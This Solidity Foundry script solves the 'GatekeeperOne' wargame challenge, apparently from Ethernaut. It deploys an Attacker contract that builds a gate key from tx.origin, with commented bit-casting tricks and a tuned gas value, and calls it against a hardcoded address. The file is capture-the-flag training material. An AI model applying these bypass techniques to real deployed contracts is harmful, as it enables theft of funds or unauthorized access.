// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/GatekeeperOne.sol";

contract Attacker {
    GatekeeperOne private immutable gatekeeper;
    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperOne(_gatekeeper);
    }

    function bypass(uint256 _gas) external {
        uint16 pass16 = uint16(uint160(tx.origin));
        // in order to bypass uint32(uint64(_gateKey)) != uint64(_gateKey) 
        // we need to put a 1 at the very left of the uint64(_gateKey) and cast it to uint32()
        // the 1 on the very left will be cut off.

        uint64 pass64 = uint64(1 << 63) + uint64(pass16);
        bytes8 passBytes8 = bytes8(pass64); // this is possible because uint64 is 8 bytes
        gatekeeper.enter{gas: 8191 * 10 + _gas}(passBytes8);
    }

}

contract GatekeeperOneScript is Script {

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        GatekeeperOne gatekeeper = GatekeeperOne(0xC01F24955aa62651fa88E19E9fe4d01DF97F2911);
        Attacker attacker = new Attacker(address(gatekeeper));
        attacker.bypass(256);
        vm.stopBroadcast();

    }
}

